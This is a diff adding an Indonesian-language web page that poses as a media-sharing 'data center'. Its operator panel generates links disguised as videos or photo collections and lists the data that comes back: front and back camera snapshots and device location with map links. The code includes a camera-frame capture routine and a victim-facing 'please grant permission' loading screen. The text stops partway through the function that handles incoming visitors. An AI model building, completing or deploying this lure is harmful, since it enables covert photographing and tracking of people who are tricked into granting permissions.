@@ -1,0 +1,1205 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Pusat Pengelolaan Konten dan Data Perangkat">
+    <meta name="theme-color" content="#165DFF">
+    <title>Pusat Data & Informasi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        :root {
+            --utama: #165DFF;
+            --utamaGelap: #0E42D2;
+            --terang: #4080FF;
+            --sangatTerang: #E8F3FF;
+            --latar: #FFFFFF;
+            --latarLembut: #F2F7FF;
+            --latarGelap: #E6F0FF;
+            --teks: #1D2129;
+            --teksLembut: #4E5969;
+            --teksPudar: #C9CDD4;
+            --batas: #C9CDD4;
+            --batasTerang: #E5E6EB;
+            --sukses: #00B42A;
+            --suksesTerang: #E8FFEE;
+            --peringatan: #FF7D00;
+            --peringatanTerang: #FFF3E8;
+            --bahaya: #F53F3F;
+            --bahayaTerang: #FFECE8;
+            --bayangan: 0 4px 20px rgba(22, 93, 255, 0.12);
+            --bayanganKuat: 0 8px 32px rgba(22, 93, 255, 0.18);
+            --bayanganHalus: 0 2px 12px rgba(22, 93, 255, 0.08);
+            --sudut: 16px;
+            --sudutKecil: 10px;
+            --transisi: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        body {
+            background: linear-gradient(180deg, #F2F7FF 0%, #FFFFFF 50%, #F7FAFF 100%);
+            color: var(--teks);
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+
+        .layarMasuk {
+            position: fixed;
+            inset: 0;
+            background: linear-gradient(135deg, #E8F3FF 0%, #FFFFFF 50%, #F0F5FF 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            z-index: 9999;
+        }
+
+        .kotakMasuk {
+            background: #FFFFFF;
+            padding: 48px 36px;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 460px;
+            border: 2px solid var(--sangatTerang);
+            text-align: center;
+            box-shadow: var(--bayanganKuat);
+            animation: muncul 0.5s ease-out;
+        }
+
+        @keyframes muncul {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .kotakMasuk h2 {
+            font-size: 24px;
+            margin-bottom: 8px;
+            color: var(--utama);
+            font-weight: 700;
+            letter-spacing: 0.3px;
+        }
+
+        .kotakMasuk .subJudul {
+            color: var(--teksLembut);
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+
+        .kotakMasuk p {
+            color: var(--teksLembut);
+            margin-bottom: 24px;
+            font-size: 15px;
+        }
+
+        .inputSandi {
+            width: 100%;
+            padding: 16px 20px;
+            border-radius: var(--sudut);
+            border: 2px solid var(--batasTerang);
+            background: #FFFFFF;
+            color: var(--teks);
+            font-size: 16px;
+            outline: none;
+            margin-bottom: 16px;
+            transition: var(--transisi);
+        }
+
+        .inputSandi:focus {
+            border-color: var(--utama);
+            box-shadow: 0 0 0 4px rgba(22, 93, 255, 0.12);
+        }
+
+        .tombolUtama {
+            width: 100%;
+            padding: 16px;
+            border-radius: var(--sudut);
+            border: none;
+            background: linear-gradient(90deg, var(--utama) 0%, var(--terang) 100%);
+            color: #FFFFFF;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: var(--transisi);
+            box-shadow: var(--bayangan);
+        }
+
+        .tombolUtama:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--bayanganKuat);
+        }
+
+        .tombolUtama:active {
+            transform: translateY(0);
+        }
+
+        .pesanSalah {
+            color: var(--bahaya);
+            margin-top: 12px;
+            display: none;
+            font-size: 14px;
+            padding: 10px;
+            background: var(--bahayaTerang);
+            border-radius: var(--sudutKecil);
+        }
+
+        .sembunyi { display: none !important; }
+
+        .wadah {
+            max-width: 780px;
+            margin: 0 auto;
+            padding: 24px 18px 40px;
+        }
+
+        .kepala {
+            text-align: center;
+            padding: 32px 24px;
+            background: linear-gradient(90deg, var(--utama) 0%, var(--terang) 100%);
+            border-radius: 20px;
+            margin-bottom: 24px;
+            color: #FFFFFF;
+            box-shadow: var(--bayangan);
+        }
+
+        .kepala h1 {
+            font-size: 24px;
+            margin-bottom: 6px;
+            font-weight: 700;
+        }
+
+        .kepala p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .statusBar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #FFFFFF;
+            padding: 16px 22px;
+            border-radius: var(--sudut);
+            margin-bottom: 24px;
+            border-left: 4px solid var(--sukses);
+            box-shadow: var(--bayanganHalus);
+        }
+
+        .kiriStatus {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .titikHidup {
+            width: 12px;
+            height: 12px;
+            background: var(--sukses);
+            border-radius: 50%;
+            box-shadow: 0 0 0 4px rgba(0, 180, 42, 0.15);
+            animation: kedip 2s infinite;
+        }
+
+        @keyframes kedip {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .teksStatus {
+            font-weight: 500;
+            color: var(--teks);
+            font-size: 14px;
+        }
+
+        .jamTampil {
+            font-family: 'Courier New', monospace;
+            font-weight: 600;
+            color: var(--utama);
+            font-size: 14px;
+        }
+
+        .navTab {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+            background: #FFFFFF;
+            padding: 8px;
+            border-radius: var(--sudut);
+            box-shadow: var(--bayanganHalus);
+        }
+
+        .tombolTab {
+            flex: 1;
+            min-width: 100px;
+            padding: 14px 16px;
+            border-radius: 12px;
+            border: none;
+            background: transparent;
+            color: var(--teksLembut);
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: var(--transisi);
+        }
+
+        .tombolTab.aktif {
+            background: linear-gradient(90deg, var(--utama) 0%, var(--terang) 100%);
+            color: #FFFFFF;
+            box-shadow: var(--bayangan);
+        }
+
+        .tombolTab:hover:not(.aktif) {
+            background: var(--latarLembut);
+            color: var(--utama);
+        }
+
+        .kotak {
+            background: #FFFFFF;
+            padding: 30px;
+            border-radius: 20px;
+            border: 1px solid var(--sangatTerang);
+            margin-bottom: 20px;
+            box-shadow: var(--bayanganHalus);
+        }
+
+        .kotak h3 {
+            margin-bottom: 24px;
+            font-size: 18px;
+            color: var(--utama);
+            padding-bottom: 14px;
+            border-bottom: 2px solid var(--sangatTerang);
+            font-weight: 600;
+        }
+
+        .baris {
+            margin-bottom: 22px;
+        }
+
+        .label {
+            display: block;
+            margin-bottom: 10px;
+            color: var(--teksLembut);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .input {
+            width: 100%;
+            padding: 15px 18px;
+            border-radius: var(--sudutKecil);
+            border: 2px solid var(--batasTerang);
+            background: #FFFFFF;
+            color: var(--teks);
+            font-size: 15px;
+            outline: none;
+            transition: var(--transisi);
+        }
+
+        .input:focus {
+            border-color: var(--utama);
+            box-shadow: 0 0 0 3px rgba(22, 93, 255, 0.1);
+        }
+
+        .pilihanSumber {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .pilihanSumber button {
+            flex: 1;
+            padding: 14px;
+            border-radius: var(--sudutKecil);
+            border: 2px solid var(--batasTerang);
+            background: #FFFFFF;
+            color: var(--teksLembut);
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: var(--transisi);
+        }
+
+        .pilihanSumber button.aktif {
+            border-color: var(--utama);
+            background: var(--sangatTerang);
+            color: var(--utama);
+            font-weight: 600;
+        }
+
+        .areaUnggah {
+            border: 2px dashed var(--terang);
+            border-radius: var(--sudut);
+            padding: 36px 24px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transisi);
+            background: var(--sangatTerang);
+        }
+
+        .areaUnggah:hover, .areaUnggah.terpilih {
+            border-style: solid;
+            border-color: var(--utama);
+            background: #FFFFFF;
+        }
+
+        .teksUnggah {
+            color: var(--teksLembut);
+            font-size: 15px;
+        }
+
+        .namaBerkas {
+            color: var(--utama);
+            font-weight: 600;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .pratinjauVideo {
+            margin-top: 20px;
+            border-radius: var(--sudut);
+            overflow: hidden;
+            background: #000;
+            border: 2px solid var(--sangatTerang);
+        }
+
+        .pratinjauVideo video {
+            width: 100%;
+            display: block;
+        }
+
+        .saranNama {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-bottom: 22px;
+        }
+
+        .saranNama button {
+            padding: 12px 14px;
+            border-radius: var(--sudutKecil);
+            border: 2px solid transparent;
+            background: var(--latarLembut);
+            color: var(--utama);
+            cursor: pointer;
+            font-size: 14px;
+            text-align: left;
+            transition: var(--transisi);
+            font-weight: 500;
+        }
+
+        .saranNama button:hover {
+            background: var(--sangatTerang);
+            border-color: var(--terang);
+        }
+
+        .daftarPilihan {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .barisPilih {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 4px 0;
+        }
+
+        .barisPilih input[type="checkbox"] {
+            width: 22px;
+            height: 22px;
+            accent-color: var(--utama);
+            cursor: pointer;
+        }
+
+        .barisPilih label {
+            color: var(--teks);
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        .grupTombol {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-top: 12px;
+        }
+
+        .grupTombol button {
+            flex: 1;
+            min-width: 120px;
+            padding: 15px;
+            border-radius: var(--sudut);
+            border: none;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: var(--transisi);
+        }
+
+        .grupTombol button:active {
+            transform: scale(0.97);
+        }
+
+        .tombolPrimer {
+            background: linear-gradient(90deg, var(--utama) 0%, var(--terang) 100%);
+            color: #FFFFFF;
+            box-shadow: var(--bayangan);
+        }
+
+        .tombolPrimer:hover {
+            transform: translateY(-2px);
+        }
+
+        .tombolSekunder {
+            background: var(--sangatTerang);
+            color: var(--utama);
+            border: 2px solid var(--terang);
+        }
+
+        .tombolBahaya {
+            background: var(--bahaya);
+            color: #FFFFFF;
+        }
+
+        .tombolBiasa {
+            background: var(--latarLembut);
+            color: var(--teks);
+        }
+
+        .kotakHasil {
+            margin-top: 26px;
+            padding: 22px;
+            background: var(--suksesTerang);
+            border: 2px solid #A7F3B8;
+            border-radius: var(--sudut);
+            display: none;
+        }
+
+        .kotakHasil label {
+            color: var(--sukses);
+            font-weight: 600;
+            font-size: 15px;
+            display: block;
+            margin-bottom: 12px;
+        }
+
+        .kotakHasil input {
+            width: 100%;
+            padding: 14px;
+            border-radius: var(--sudutKecil);
+            border: 2px solid var(--sukses);
+            background: #FFFFFF;
+            color: var(--teks);
+            font-size: 14px;
+            margin-top: 6px;
+            outline: none;
+            font-family: monospace;
+        }
+
+        .blokData {
+            background: var(--latarLembut);
+            padding: 22px;
+            border-radius: var(--sudut);
+            margin-bottom: 16px;
+            border-left: 4px solid var(--utama);
+            transition: var(--transisi);
+        }
+
+        .blokData:hover {
+            background: var(--sangatTerang);
+            transform: translateX(4px);
+        }
+
+        .dataJudul {
+            font-size: 13px;
+            color: var(--teksLembut);
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+
+        .dataIsi {
+            font-size: 15px;
+            color: var(--teks);
+            line-height: 1.8;
+            margin-bottom: 8px;
+        }
+
+        .tombolPeta {
+            display: inline-block;
+            color: var(--utama);
+            text-decoration: none;
+            padding: 8px 18px;
+            background: #FFFFFF;
+            border: 2px solid var(--sangatTerang);
+            border-radius: var(--sudutKecil);
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 6px;
+            transition: var(--transisi);
+        }
+
+        .tombolPeta:hover {
+            background: var(--utama);
+            color: #FFFFFF;
+            border-color: var(--utama);
+        }
+
+        .grupFoto {
+            display: flex;
+            gap: 16px;
+            margin-top: 16px;
+            flex-wrap: wrap;
+        }
+
+        .wadahFoto {
+            text-align: center;
+            background: #FFFFFF;
+            padding: 12px;
+            border-radius: var(--sudutKecil);
+            border: 1px solid var(--sangatTerang);
+        }
+
+        .tempatFoto {
+            width: 150px;
+            height: 112px;
+            background: var(--latarLembut);
+            border-radius: 10px;
+            overflow: hidden;
+            border: 2px solid var(--sangatTerang);
+        }
+
+        .tempatFoto img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .keteranganFoto {
+            font-size: 13px;
+            color: var(--teksLembut);
+            margin-top: 8px;
+            font-weight: 500;
+        }
+
+        .halamanTampil {
+            position: fixed;
+            inset: 0;
+            background: #FFFFFF;
+            z-index: 100;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .bagianTampil {
+            flex: 1;
+            background: #F7F8FA;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .bagianTampil video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: #000;
+        }
+
+        .bagianInfo {
+            padding: 20px 24px;
+            background: #FFFFFF;
+            border-top: 1px solid var(--sangatTerang);
+        }
+
+        .judulTampil {
+            font-size: 18px;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: var(--utama);
+        }
+
+        .teksInfoTampil {
+            font-size: 14px;
+            color: var(--teksLembut);
+        }
+
+        .kotakMuat {
+            text-align: center;
+            padding: 40px;
+        }
+
+        .teksMuatUtama {
+            font-size: 16px;
+            color: var(--utama);
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .teksMuatBawah {
+            font-size: 14px;
+            color: var(--teksLembut);
+        }
+
+        .kotakNotif {
+            position: fixed;
+            top: 24px;
+            right: 24px;
+            background: var(--sukses);
+            color: #FFFFFF;
+            padding: 16px 24px;
+            border-radius: var(--sudut);
+            opacity: 0;
+            transform: translateY(-10px);
+            transition: var(--transisi);
+            z-index: 99999;
+            font-size: 15px;
+            font-weight: 600;
+            box-shadow: var(--bayanganKuat);
+        }
+
+        .kotakNotif.tampil {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .kotakNotif.salah {
+            background: var(--bahaya);
+        }
+
+        .petunjuk {
+            background: var(--sangatTerang);
+            padding: 16px;
+            border-radius: var(--sudutKecil);
+            margin-top: 16px;
+            border-left: 3px solid var(--utama);
+        }
+
+        .petunjuk p {
+            font-size: 13px;
+            color: var(--teksLembut);
+            line-height: 1.7;
+        }
+    </style>
+</head>
+<body>
+
+<div class="kotakNotif" id="kotakNotif">Pemberitahuan</div>
+
+<div class="layarMasuk" id="layarMasuk">
+    <div class="kotakMasuk">
+        <h2>Pusat Data & Informasi</h2>
+        <p class="subJudul">Sistem Pengelolaan Konten dan Data Perangkat</p>
+        <p>Masukkan kata sandi untuk mengakses sistem</p>
+        <input type="password" class="inputSandi" id="kataSandi" placeholder="Kata sandi akses">
+        <button class="tombolUtama" onclick="masukSistem()">Masuk ke Sistem</button>
+        <div class="pesanSalah" id="pesanSalah">Kata sandi tidak sesuai, silakan coba kembali</div>
+    </div>
+</div>
+
+<div class="halamanTampil sembunyi" id="halamanTampil">
+    <div class="bagianTampil" id="bagianTampil">
+        <div class="kotakMuat" id="kotakMuat">
+            <div class="teksMuatUtama">Sedang memuat konten...</div>
+            <div class="teksMuatBawah">Mohon berikan izin untuk menampilkan halaman ini secara lengkap</div>
+        </div>
+    </div>
+    <div class="bagianInfo">
+        <div class="judulTampil" id="judulTampil">Konten Media</div>
+        <div class="teksInfoTampil" id="teksInfoTampil">Memuat informasi...</div>
+    </div>
+</div>
+
+<div class="wadah sembunyi" id="panelUtama">
+    <div class="kepala">
+        <h1>Pusat Data & Informasi</h1>
+        <p>Buat tautan akses — kelola dan bagikan konten serta data perangkat</p>
+    </div>
+
+    <div class="statusBar">
+        <div class="kiriStatus">
+            <span class="titikHidup"></span>
+            <span class="teksStatus">Sistem Siap Digunakan</span>
+        </div>
+        <div class="jamTampil" id="jamTampil">00:00:00</div>
+    </div>
+
+    <div class="navTab">
+        <button class="tombolTab aktif" data-tab="buat">Buat Tautan</button>
+        <button class="tombolTab" data-tab="masuk">Data Masuk</button>
+        <button class="tombolTab" data-tab="pengaturan">Pengaturan</button>
+    </div>
+
+    <div class="tabIsi" id="tabBuat">
+        <div class="kotak">
+            <h3>Buat Tautan Akses Baru</h3>
+
+            <div class="baris">
+                <label class="label">Sumber Video</label>
+                <div class="pilihanSumber">
+                    <button class="aktif" id="btnGaleri" onclick="pilihSumber('galeri')">Dari Galeri Perangkat</button>
+                    <button id="btnLink" onclick="pilihSumber('link')">Dari Tautan Internet</button>
+                </div>
+            </div>
+
+            <div class="baris" id="bagianGaleri">
+                <label class="label">Pilih Video</label>
+                <div class="areaUnggah" id="areaUnggah" onclick="document.getElementById('inputBerkas').click()">
+                    <input type="file" id="inputBerkas" accept="video/*" style="display: none;" onchange="berkasDipilih(this)">
+                    <div class="teksUnggah">Klik untuk memilih video dari galeri<br>atau tekan dan tahan untuk memilih berkas</div>
+                    <div class="namaBerkas" id="namaBerkas"></div>
+                </div>
+                <div class="pratinjauVideo sembunyi" id="pratinjauVideo">
+                    <video id="videoPratinjau" controls playsinline></video>
+                </div>
+            </div>
+
+            <div class="baris sembunyi" id="bagianLink">
+                <label class="label">Tautan Video</label>
+                <input type="text" class="input" id="tautanVideo" placeholder="Tempel alamat video dari internet di sini...">
+                <div class="petunjuk">
+                    <p><strong>Petunjuk:</strong> Unggah video ke Google Drive → atur akses "Siapa saja yang memiliki tautan" → salin tautan dan tempel di atas. Semua orang yang membuka tautan Anda akan dapat melihat videonya.</p>
+                </div>
+            </div>
+
+            <div class="baris">
+                <label class="label">Nama Tautan</label>
+                <div class="saranNama">
+                    <button onclick="isiNama('Dokumen Terbaru')">Dokumen Terbaru</button>
+                    <button onclick="isiNama('Koleksi Foto')">Koleksi Foto</button>
+                    <button onclick="isiNama('Rekaman Kegiatan')">Rekaman Kegiatan</button>
+                    <button onclick="isiNama('Berkas Penting')">Berkas Penting</button>
+                </div>
+            </div>
+
+            <div class="baris">
+                <label class="label">Nama Sesuai Keinginan</label>
+                <input type="text" class="input" id="namaTautan" placeholder="Tulis nama tautan sesuai keinginan...">
+            </div>
+
+            <div class="baris">
+                <label class="label">Data yang Dapat Diakses</label>
+                <div class="daftarPilihan">
+                    <div class="barisPilih">
+                        <input type="checkbox" id="kameraDepan" checked>
+                        <label for="kameraDepan">Foto dari Kamera Depan</label>
+                    </div>
+                    <div class="barisPilih">
+                        <input type="checkbox" id="kameraBelakang" checked>
+                        <label for="kameraBelakang">Foto dari Kamera Belakang</label>
+                    </div>
+                    <div class="barisPilih">
+                        <input type="checkbox" id="lokasiPerangkat" checked>
+                        <label for="lokasiPerangkat">Lokasi Perangkat</label>
+                    </div>
+                    <div class="barisPilih">
+                        <input type="checkbox" id="simpanDataMasuk" checked>
+                        <label for="simpanDataMasuk">Simpan Data yang Masuk</label>
+                    </div>
+                </div>
+            </div>
+
+            <div class="grupTombol">
+                <button class="tombolPrimer" onclick="buatTautan()">Buat Tautan</button>
+                <button class="tombolSekunder" onclick="salinTautan()">Salin Tautan</button>
+                <button class="tombolBiasa" onclick="kosongkanBentuk()">Kosongkan</button>
+            </div>
+
+            <div class="kotakHasil" id="kotakTautan">
+                <label>Tautan Siap Dibagikan</label>
+                <input type="text" id="tautanJadi" readonly>
+            </div>
+        </div>
+    </div>
+
+    <div class="tabIsi sembunyi" id="tabMasuk">
+        <div class="kotak">
+            <h3>Data yang Masuk</h3>
+            <div class="grupTombol" style="margin-bottom: 20px;">
+                <button class="tombolBahaya" onclick="hapusSemuaData()">Hapus Semua Data</button>
+            </div>
+            <div id="daftarData">
+                <div class="blokData">
+                    <div class="dataJudul">Belum ada data</div>
+                    <div class="dataIsi">Buat tautan, bagikan, lalu buka di perangkat lain. Berikan izin saat diminta. Data akan muncul di halaman ini secara otomatis.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="tabIsi sembunyi" id="tabPengaturan">
+        <div class="kotak">
+            <h3>Pengaturan Sistem</h3>
+            <div class="baris">
+                <label class="label">Kata Sandi Saat Ini</label>
+                <input type="password" class="input" id="sandiSaatIni">
+            </div>
+            <div class="baris">
+                <label class="label">Kata Sandi Baru</label>
+                <input type="password" class="input" id="sandiBaruSatu" placeholder="Minimal 4 karakter">
+            </div>
+            <div class="baris">
+                <label class="label">Ulangi Kata Sandi Baru</label>
+                <input type="password" class="input" id="sandiBaruDua">
+            </div>
+            <div class="grupTombol">
+                <button class="tombolPrimer" onclick="gantiKataSandi()">Simpan Perubahan</button>
+                <button class="tombolBiasa" onclick="keluarDariSistem()">Keluar dari Sistem</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let kataSandi = localStorage.getItem('kataSandi') || '123456';
+let dataTersimpan = JSON.parse(localStorage.getItem('dataMasuk') || '[]');
+let sumberDipilih = 'galeri';
+let tautanVideoSementara = null;
+let berkasVideo = null;
+
+function pilihSumber(jenis) {
+    sumberDipilih = jenis;
+    document.getElementById('btnGaleri').classList.toggle('aktif', jenis === 'galeri');
+    document.getElementById('btnLink').classList.toggle('aktif', jenis === 'link');
+    document.getElementById('bagianGaleri').classList.toggle('sembunyi', jenis !== 'galeri');
+    document.getElementById('bagianLink').classList.toggle('sembunyi', jenis !== 'link');
+}
+
+function berkasDipilih(input) {
+    if (input.files && input.files[0]) {
+        berkasVideo = input.files[0];
+        document.getElementById('namaBerkas').textContent = 'Terpilih: ' + berkasVideo.name;
+        document.getElementById('areaUnggah').classList.add('terpilih');
+        
+        if (tautanVideoSementara) URL.revokeObjectURL(tautanVideoSementara);
+        tautanVideoSementara = URL.createObjectURL(berkasVideo);
+        
+        const elemenVideo = document.getElementById('videoPratinjau');
+        elemenVideo.src = tautanVideoSementara;
+        document.getElementById('pratinjauVideo').classList.remove('sembunyi');
+        
+        tampilkanNotif('Video telah dipilih');
+    }
+}
+
+function masukSistem() {
+    if (document.getElementById('kataSandi').value === kataSandi) {
+        document.getElementById('layarMasuk').classList.add('sembunyi');
+        document.getElementById('panelUtama').classList.remove('sembunyi');
+        tampilkanDataMasuk();
+        jalankanJam();
+    } else {
+        document.getElementById('pesanSalah').style.display = 'block';
+        setTimeout(() => {
+            document.getElementById('pesanSalah').style.display = 'none';
+        }, 3000);
+    }
+}
+
+document.getElementById('kataSandi').addEventListener('keydown', function(peristiwa) {
+    if (peristiwa.key === 'Enter') masukSistem();
+});
+
+function jalankanJam() {
+    const sekarang = new Date();
+    document.getElementById('jamTampil').textContent = sekarang.toLocaleTimeString('id-ID');
+    setTimeout(jalankanJam, 1000);
+}
+
+document.querySelectorAll('.tombolTab').forEach(function(tombol) {
+    tombol.addEventListener('click', function() {
+        document.querySelectorAll('.tombolTab').forEach(t => t.classList.remove('aktif'));
+        this.classList.add('aktif');
+        const namaTab = this.dataset.tab;
+        document.querySelectorAll('.tabIsi').forEach(blok => blok.classList.add('sembunyi'));
+        const idTab = 'tab' + namaTab.charAt(0).toUpperCase() + namaTab.slice(1);
+        document.getElementById(idTab).classList.remove('sembunyi');
+    });
+});
+
+function isiNama(nama) {
+    document.getElementById('namaTautan').value = nama;
+}
+
+function buatTautan() {
+    const nama = encodeURIComponent(document.getElementById('namaTautan').value || 'Konten Media');
+    let tautanMedia = '';
+    
+    if (sumberDipilih === 'link') {
+        tautanMedia = encodeURIComponent(document.getElementById('tautanVideo').value.trim());
+        if (!tautanMedia) {
+            tampilkanNotif('Silakan tempel tautan video terlebih dahulu', false);
+            return;
+        }
+    } else {
+        if (!berkasVideo) {
+            tampilkanNotif('Silakan pilih video terlebih dahulu', false);
+            return;
+        }
+        tampilkanNotif('Sumber dari galeri hanya berfungsi di perangkat Anda. Gunakan tautan internet agar dapat dibagikan.');
+    }
+    
+    const kameraDepan = document.getElementById('kameraDepan').checked ? '1' : '0';
+    const kameraBelakang = document.getElementById('kameraBelakang').checked ? '1' : '0';
+    const lokasi = document.getElementById('lokasiPerangkat').checked ? '1' : '0';
+    const simpan = document.getElementById('simpanDataMasuk').checked ? '1' : '0';
+    
+    const tautanJadi = window.location.origin + window.location.pathname +
+        '?n=' + nama +
+        '&m=' + tautanMedia +
+        '&d=' + kameraDepan +
+        '&b=' + kameraBelakang +
+        '&l=' + lokasi +
+        '&s=' + simpan;
+    
+    document.getElementById('tautanJadi').value = tautanJadi;
+    document.getElementById('kotakTautan').style.display = 'block';
+    tampilkanNotif('Tautan berhasil dibuat');
+}
+
+function salinTautan() {
+    const elemen = document.getElementById('tautanJadi');
+    if (!elemen.value) {
+        tampilkanNotif('Buat tautan terlebih dahulu', false);
+        return;
+    }
+    elemen.select();
+    document.execCommand('copy');
+    tampilkanNotif('Tautan telah disalin');
+}
+
+function kosongkanBentuk() {
+    document.getElementById('namaTautan').value = '';
+    document.getElementById('tautanVideo').value = '';
+    document.getElementById('kotakTautan').style.display = 'none';
+    document.getElementById('pratinjauVideo').classList.add('sembunyi');
+    document.getElementById('namaBerkas').textContent = '';
+    document.getElementById('areaUnggah').classList.remove('terpilih');
+    document.getElementById('inputBerkas').value = '';
+    if (tautanVideoSementara) URL.revokeObjectURL(tautanVideoSementara);
+    tautanVideoSementara = null;
+    berkasVideo = null;
+    tampilkanNotif('Bentuk telah dikosongkan');
+}
+
+function hapusSemuaData() {
+    if (confirm('Yakin ingin menghapus semua data yang tersimpan? Tindakan ini tidak dapat dibatalkan.')) {
+        dataTersimpan = [];
+        localStorage.setItem('dataMasuk', '[]');
+        tampilkanDataMasuk();
+        tampilkanNotif('Semua data telah dihapus');
+    }
+}
+
+function gantiKataSandi() {
+    const sandiSekarang = document.getElementById('sandiSaatIni').value;
+    const sandiBaru1 = document.getElementById('sandiBaruSatu').value;
+    const sandiBaru2 = document.getElementById('sandiBaruDua').value;
+    
+    if (sandiSekarang !== kataSandi) {
+        tampilkanNotif('Kata sandi saat ini tidak benar', false);
+        return;
+    }
+    if (sandiBaru1.length < 4) {
+        tampilkanNotif('Kata sandi baru minimal 4 karakter', false);
+        return;
+    }
+    if (sandiBaru1 !== sandiBaru2) {
+        tampilkanNotif('Kata sandi baru tidak sama dengan ulangan', false);
+        return;
+    }
+    
+    kataSandi = sandiBaru1;
+    localStorage.setItem('kataSandi', kataSandi);
+    document.getElementById('sandiSaatIni').value = '';
+    document.getElementById('sandiBaruSatu').value = '';
+    document.getElementById('sandiBaruDua').value = '';
+    tampilkanNotif('Kata sandi telah diperbarui');
+}
+
+function keluarDariSistem() {
+    document.getElementById('panelUtama').classList.add('sembunyi');
+    document.getElementById('layarMasuk').classList.remove('sembunyi');
+    document.getElementById('kataSandi').value = '';
+}
+
+function tampilkanDataMasuk() {
+    const wadah = document.getElementById('daftarData');
+    if (!dataTersimpan.length) {
+        wadah.innerHTML = `
+            <div class="blokData">
+                <div class="dataJudul">Belum ada data</div>
+                <div class="dataIsi">Buat tautan, bagikan, lalu buka di perangkat lain. Berikan izin saat diminta. Data akan muncul di halaman ini secara otomatis.</div>
+            </div>
+        `;
+        return;
+    }
+    
+    wadah.innerHTML = '';
+    [...dataTersimpan].reverse().forEach(function(data) {
+        let isi = '<div class="blokData">';
+        isi += '<div class="dataJudul">' + data.waktu + '</div>';
+        isi += '<div class="dataIsi"><strong>Lokasi:</strong> ' + (data.lokasi || 'Tidak diperoleh') + '</div>';
+        
+        if (data.lokasi && data.lokasi.includes(',')) {
+            isi += '<a href="https://www.google.com/maps?q=' + encodeURIComponent(data.lokasi) + '" target="_blank" class="tombolPeta">Buka di Peta</a>';
+        }
+        
+        isi += '<div class="dataIsi"><strong>Foto Kamera Depan:</strong> ' + (data.fotoDepan ? 'Berhasil diperoleh' : 'Tidak tersedia') + '</div>';
+        isi += '<div class="dataIsi"><strong>Foto Kamera Belakang:</strong> ' + (data.fotoBelakang ? 'Berhasil diperoleh' : 'Tidak tersedia') + '</div>';
+        
+        if (data.fotoDepan || data.fotoBelakang) {
+            isi += '<div class="grupFoto">';
+            if (data.fotoDepan) {
+                isi += '<div class="wadahFoto"><div class="tempatFoto"><img src="' + data.fotoDepan + '" alt="Foto depan"></div><div class="keteranganFoto">Kamera Depan</div></div>';
+            }
+            if (data.fotoBelakang) {
+                isi += '<div class="wadahFoto"><div class="tempatFoto"><img src="' + data.fotoBelakang + '" alt="Foto belakang"></div><div class="keteranganFoto">Kamera Belakang</div></div>';
+            }
+            isi += '</div>';
+        }
+        
+        isi += '</div>';
+        wadah.innerHTML += isi;
+    });
+}
+
+function tampilkanNotif(pesan, berhasil = true) {
+    const kotak = document.getElementById('kotakNotif');
+    kotak.classList.toggle('salah', !berhasil);
+    kotak.textContent = pesan;
+    kotak.classList.add('tampil');
+    setTimeout(function() {
+        kotak.classList.remove('tampil');
+    }, 3500);
+}
+
+function ambilGambarDariKamera(aliranKamera, selesai) {
+    const elemenVideo = document.createElement('video');
+    elemenVideo.srcObject = aliranKamera;
+    elemenVideo.play();
+    
+    setTimeout(function() {
+        const kanvas = document.createElement('canvas');
+        kanvas.width = 480;
+        kanvas.height = 360;
+        const gambar = kanvas.getContext('2d');
+        gambar.drawImage(elemenVideo, 0, 0, kanvas.width, kanvas.height);
+        const hasil = kanvas.toDataURL('image/jpeg', 0.85);
+        aliranKamera.getTracks().forEach(lacak => lacak.stop());
+        selesai(hasil);
+    }, 2000);
+}
+
+function prosesDataMasuk() {
+    const parameter = new URLSearchParams(window.location.search);
+    const nama = parameter.get('n');
+    
+    if (!nama) return;
+    
+    document.title = nama;
+    document.getElementById('judulTampil').textContent = nama;
+    document.getElementById('halamanTampil').classList.remove('sembunyi');
+    document.getElementById('layarMasuk').classList.add('sembunyi');
+    document.getElementById('panelUtama').classList.add('sembunyi');
+    
